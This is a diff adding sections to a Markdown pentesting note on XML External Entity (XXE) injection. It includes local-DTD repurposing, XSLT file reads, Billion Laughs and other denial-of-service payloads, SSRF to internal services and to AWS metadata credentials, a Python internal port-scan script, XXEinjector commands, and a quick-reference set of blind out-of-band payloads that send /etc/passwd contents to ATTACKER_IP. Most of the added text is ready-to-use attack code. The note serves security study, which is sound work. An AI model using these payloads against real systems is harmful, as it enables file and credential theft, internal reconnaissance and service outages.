@@ -4,6 +4,8 @@ tags:
   - injection
   - web_hacking
 ---
+
+
 ## XXE
 
 >**(XML External Entity (XXE) injection** is a security vulnerability that allows an attacker to interfere with an application's processing of XML data by exploiting an XML parser's native capacity to resolve external entity declarations.
@@ -482,6 +484,9 @@ XML processing points include:
 <!ENTITY ext PUBLIC "any-string" "file:///etc/passwd">
 ```
 
+ >[!tip]+ Fuzz XML payloads
+>- [`SecLists/Fuzzing/XXE-Fuzzing.txt`](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/XXE-Fuzzing.txt)
+>- [`payloadbox/xxe-injection-payload-list`](https://github.com/payloadbox/xxe-injection-payload-list?tab=readme-ov-file)
 ### 3. Enumerate accessible files 
 
 - Once LFI is confirmed, enumerate files systematically. High-value targets on Linux:
@@ -533,13 +538,12 @@ C:\Windows\win.ini
 C:\Users\<user>\.ssh\id_rsa
 ```
 
-> [!note] Use LFI wordlists from SecLists to fuzz for accessible files at scale: `seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt` for Linux, `LFI-gracefulsecurity-windows.txt` for Windows. 
+>[!tip] Fuzz files using LFI wordlists
+> - [`seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt`](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt)
+> - [`seclists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt`](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt)
+> - [`seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt`](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt) (Windows)
 
- 
- >[!tip]+ Fuzzing
->- Fuzz XML payloads automatically using:
- >	- [`SecLists/Fuzzing/XXE-Fuzzing.txt`](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/XXE-Fuzzing.txt)
- >	- [`payloadbox/xxe-injection-payload-list`](https://github.com/payloadbox/xxe-injection-payload-list?tab=readme-ov-file)
+
 ### 4. Handle special characters — CDATA or PHP filter
 
 - Files with XML special characters (`<`, `>`, `&`) can't be directly embedded in entity values — the parser will interpret them as XML markup and fail. 
@@ -778,35 +782,362 @@ When inline parameter entity construction is blocked (some parsers restrict nest
 	- The application strips `DOCTYPE` declarations from input but processes `<xi:include>` elements.
 	- Server-side XML assembly pipelines include fragments from user-supplied content.
 
+## Repurposing local DTD
+
+- Some environments restrict external HTTP connections but allow local `file://` URIs.
+- In these cases, even in a fully blind environment without OOB interactions, the vulnerability can be exploited by **repurposing local DTD files already present on the target server filesystem**.
+---
+- The technique exploits a specific XML rule: a parameter entity defined in an internal DTD subset can **redefine** a parameter entity that was originally defined in an external DTD.
+- So, you can load load a *known local DTD* and then *override one of its parameter entities with a payload*.
+---
+1. **Enumerate local DTD files**
+	- Test common paths and observe how the application behaves; look for changes in response that may indicate the file exists:
+
+```xml
+<!DOCTYPE foo [
+  <!ENTITY % local SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+  %local;
+]>
+```
+
+>[!tip]+ Common local DTD locations
+> 
+> ```
+> /usr/share/yelp/dtd/docbookx.dtd          (GNOME/yelp documentation)
+> /usr/share/xml/docbook/schema/dtd/4.5/docbookx.dtd
+> /usr/share/xml/fontconfig/fonts.dtd
+> /etc/xml/docbook-xml/4.5/docbookx.dtd
+> C:\Windows\System32\wbem\xml\cim20.dtd    (Windows)
+> ```
+
+2. **Find an entity you can redefine**
+	- Once you found a valid DTD, find a *parameter entity* it defines that your payload can redefine. 
+	- Find the DTD source code online and examine its parameter entity declarations (alternatively, fuzz common entity names).
+
+3. **Build a hybrid DTD payload**
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE message [
+  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+  <!ENTITY % ISOamsa '
+    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+    &#x25;eval;
+    &#x25;error;
+  '>
+  %local_dtd;
+]>
+<message>trigger</message>
+```
+
+- Here `%ISOamsa` is a parameter entity defined by the [DocBook DTD](https://github.com/GNOME/yelp/blob/master/data/dtd/docbookx.dtd). 
+- The payload redefines the [`ISOamsa` parameter entity](https://github.com/GNOME/yelp/blob/7856e7f79070f515282875212e1a90f09cfa5538/data/dtd/docbookx.dtd#L1). 
+- The new `%ISOamsa` definition attempts to load a non-existent file with the name that **includes the content of the `/etc/passwd` file**. 
+- This should trigger an error message that leaks the name of the non-existent file — with `/etc/passwd` inside.
+
+>[!note] The specific entity name to redefine (`ISOamsa` in this example) depends entirely on the local DTD in use. Research the DTD's source to find defined parameter entities.
+
+## XSLT-based XXE
+
+>**[XSLT (Extensible Stylesheet Language Transformations)](https://en.wikipedia.org/wiki/XSLT)** is an XML-based language for transforming XML documents.
+
+- If an application allows users to supply XSLT stylesheets, and those stylesheets are applied server-side by a processing engine, this can be exploited in XXE-injection-style attacks:
+
+```xml
+<?xml version="1.0"?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+  <xsl:template match="/">
+    <xsl:value-of select="document('file:///etc/passwd')"/>
+  </xsl:template>
+</xsl:stylesheet>
+```
+
+Or using `xsl:import` to trigger file inclusion:
+
+```xml
+<xsl:import href="file:///etc/passwd"/>
+```
+
+## Denial of Service via XXE
+
+### The Billion Laughs attack
+
+- If entity expansion limits are unset, it's possible to exploit XXE to trigger **exponential entity expansion** that causes massive memory/CPU consumption and eventually **crashes the server**. This DoS (Denial of Service) attack is known as **the Billion Laughs attack**.
+
+```XML
+<?xml version="1.0"?>
+<!DOCTYPE lolz [
+  <!ENTITY lol "lol">
+  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
+  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
+  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
+]>
+<lolz>&lol9;</lolz>
+```
+
+- Let's break this bad joke down:
+	- The entity `lol` is `"lol"` = 3 characters.
+	- `lol1` is 10 repetitions of `lol` → 10 "lol" = 30 characters.
+	- `lol2` is 10 repetitions of `lol1` → 100 "lol" = 300 characters.
+	- `...`
+	- `lol9` is $10^9$ repetitions of `lol` → ~1 billion "lol" = **~3 billion characters** (~3 GB of memory).
+
+>[!note] The name "Billion Laughs" comes from the common example where the first entity is the string `"lol"`, which expands exponentially to about a billion "lol" strings. 
+>lol :D
+
+### Quadratic blowup
+
+- **Quadratic blowup** is a variation of the Billion Laughs attack that uses quadratic entity expansion rather than exponential.
+- Less dramatic but more reliable against parsers with depth limits on recursive expansion.
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE bomb [
+  <!ENTITY a "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">
+]>
+<bomb>
+&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;
+  <!-- repeat hundreds more times -->
+</bomb>
+```
+
+- A single entity of length `N` referenced `M` times produces `N×M` characters. Memory growth is quadratic in the number of references — less violent than exponential expansion but often sufficient to degrade service.
+
+### Infinite stream
+
+ - **Infinite stream** references an infinite or extremely large system resource:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE dos [
+  <!ENTITY xxe SYSTEM "file:///dev/random">
+]>
+<dos>&xxe;</dos>
+```
+
+- On Unix, `/dev/random` generates an endless stream of random bytes. The parser reads indefinitely, consuming file descriptors and memory until the process is killed or the system runs out of resources. `/dev/urandom` produces the same result.
+
+## SSRF via XXE
+
+### Targeted internal service access
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://192.168.1.1:8080/admin">
+]>
+<root>&xxe;</root>
+```
+
+- Common internal targets:
+
+	- `http://localhost/server-status` — Apache server status.
+	- `http://localhost:8080/manager/html` — Tomcat Manager.
+	- `http://127.0.0.1:9200/` — Elasticsearch.
+	- `http://127.0.0.1:6379/` — Redis (protocol mismatch may cause errors, but connection is established).
+	- `http://127.0.0.1:2375/` — Docker daemon API.
+
+### Internal port scanning
+
+- Response timing and content differences between open, closed, and filtered ports allow blind port scanning of internal hosts:
+
+```python
+import requests
+import time
+
+target = "https://example.com/api/xml"
+internal_ip = "192.168.1.100"
+ports = [21, 22, 23, 25, 80, 443, 3306, 5432, 6379, 8080, 8443, 9200]
+
+for port in ports:
+    payload = f'''<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://{internal_ip}:{port}/">
+]>
+<root>&xxe;</root>'''
+
+    try:
+        t0 = time.time()
+        resp = requests.post(target, data=payload, timeout=10,
+                             headers={"Content-Type": "application/xml"})
+        elapsed = time.time() - t0
+
+        body = resp.text.lower()
+        if "connection refused" in body:
+            status = "CLOSED"
+        elif elapsed > 8:
+            status = "FILTERED (timeout)"
+        else:
+            status = f"OPEN ({elapsed:.2f}s)"
+
+        print(f"[{port}] {status}")
+
+    except requests.Timeout:
+        print(f"[{port}] FILTERED (timeout)")
+    except Exception as e:
+        print(f"[{port}] ERROR: {e}")
+```
+
+ - Open ports typically return quickly with some application-level content or an error referencing the service. Closed ports return `Connection refused` almost instantly. Filtered ports time out. The pattern is parser-dependent; Java parsers tend to produce the most informative error messages.
+
+## Automated XXE exploitation with `XXEinjector`
+
+- For complex OOB scenarios, manual payload construction becomes tedious. 
+- [`XXEinjector`](https://github.com/enjoiz/XXEinjector) automates OOB XXE exploitation and file enumeration.
+
+
+>[!note]+ Installation
+> ```bash
+> git clone https://github.com/enjoiz/XXEinjector.git
+> cd XXEinjector
+> ```
+
+- Basic file enumeration using OOB via HTTP:
+
+```bash
+ruby XXEinjector.rb --host=ATTACKER_IP --httpport=8000 \
+  --file=/path/to/request.txt --path=/etc/passwd --oob=http
+```
+
+- Enumerate all files in a directory:
+
+```bash
+ruby XXEinjector.rb --host=ATTACKER_IP --httpport=8000 \
+  --file=/path/to/request.txt --path=/etc/ --oob=http --enumerate
+```
+
+- Use FTP for OOB:
+
+```bash
+ruby XXEinjector.rb --host=ATTACKER_IP --ftpport=21 \
+  --file=/path/to/request.txt --path=/etc/passwd --oob=ftp
+```
+
+- The `request.txt` file is a raw HTTP request with `XXEINJECT` as a placeholder in the XML body where `XXEinjector` will inject its payload. Capture the request from Burp, replace the XML content field value with `XXEINJECT`, and save it.
+
+## Payload Quick-Reference
+
+### Confirm entity processing
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE test [<!ENTITY x "XXE-CANARY">]>
+<root><f>&x;</f></root>
+```
+
+### Basic LFI
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY f SYSTEM "file:///etc/passwd">]>
+<root><f>&f;</f></root>
+```
+
+### LFI with PHP Base64 filter
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY f SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">]>
+<root><f>&f;</f></root>
+```
+
+### SSRF to AWS metadata
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY s SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
+<root><f>&s;</f></root>
+```
+
+### Blind OOB (inline, with PHP Base64)
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE d [
+  <!ENTITY % f SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+  <!ENTITY % e "<!ENTITY &#x25; o SYSTEM 'http://ATTACKER_IP:8000/?d=%f;'>">
+  %e; %o;
+]>
+<root><f>x</f></root>
+```
+
+### Blind OOB via external DTD
+
+```xml
+<!-- attacker.dtd -->
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % oob "<!ENTITY exfil SYSTEM 'http://ATTACKER_IP:8000/?d=%file;'>">
+```
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY % r SYSTEM "http://ATTACKER_IP:8000/attacker.dtd">
+  %r; %oob;
+]>
+<root><f>&exfil;</f></root>
+```
+
+### Error-Based Exfiltration
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY % f SYSTEM "file:///etc/passwd">
+  <!ENTITY % e "<!ENTITY &#x25; err SYSTEM 'file:///nonexistent/%f;'>">
+  %e; %err;
+]>
+<root><f>x</f></root>
+```
+
+### XInclude LFI
+
+```xml
+<root xmlns:xi="http://www.w3.org/2001/XInclude">
+  <xi:include href="file:///etc/passwd" parse="text"/>
+</root>
+```
+
+### Billion Laughs DoS
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE x [
+  <!ENTITY a "lol">
+  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
+  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
+  <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
+  <!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;">
+  <!ENTITY f "&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;">
+  <!ENTITY g "&f;&f;&f;&f;&f;&f;&f;&f;&f;&f;">
+  <!ENTITY h "&g;&g;&g;&g;&g;&g;&g;&g;&g;&g;">
+  <!ENTITY i "&h;&h;&h;&h;&h;&h;&h;&h;&h;&h;">
+]>
+<x>&i;</x>
+```
 ## References and further reading
 
-
 - [`Finding and exploiting blind XXE vulnerabilities — PortSwigger`](https://portswigger.net/web-security/xxe/blind)
-
-
 - [`XML External Entity (XXE) — hackviser`](https://hackviser.com/tactics/pentesting/web/xxe)
 - [`XXE Complete Guide: Impact, Examples, and Prevention — hackerone`](https://www.hackerone.com/knowledge-center/xxe-complete-guide-impact-examples-and-prevention)
-
 - [`XML External Entity (XXE) Processing — OWASP`](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)
-
 - [`XXE — phonexicum`](https://phonexicum.github.io/infosec/xxe.html)
 - [`payloadbox/xxe-injection-payload-list`](https://github.com/payloadbox/xxe-injection-payload-list)
 - [`XXE Injection — PayloadsAllTheThings`](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
-
-
 - [`XXE: A complete guide to exploiting advanced XXE vulnerabilities — intigrity`](https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-advanced-xxe-vulnerabilities)
-
 - [`Out-of-band XML external entity (OOB XXE) — invicti`](https://www.invicti.com/learn/out-of-band-xml-external-entity-oob-xxe/)
 - [`XML External Entity (XXE) Injection Attack and Prevention`](https://www.invicti.com/blog/web-security/xxe-xml-external-entity-attacks/)
 - [`XML External Entity (XXE) Limitations — DZone`](https://dzone.com/articles/xml-external-entity-xxe-limitations)
-
 - [`XXE Cheatsheet — On Web-Security and -Insecurity`](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)
-
 - [`XML Vulnerabilities and Attacks cheatsheet`](https://gist.github.com/mgeeky/4f726d3b374f0a34267d4f19c9004870)
-
 - [`XXE Exploitation — OWASP`](https://owasp.org/www-chapter-pune/meetups/2019/November/XXE_Exploitation.pdf)
-
 - [`XML External Entity Prevention Cheat Sheet — OWASP Cheat Sheet Series`](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
-
 - [`Advanced XXE Exploitation — gosecure.github.io`](https://gosecure.github.io/xxe-workshop/#0)
-
+- [`XXEinjector`](https://github.com/enjoiz/XXEinjector)
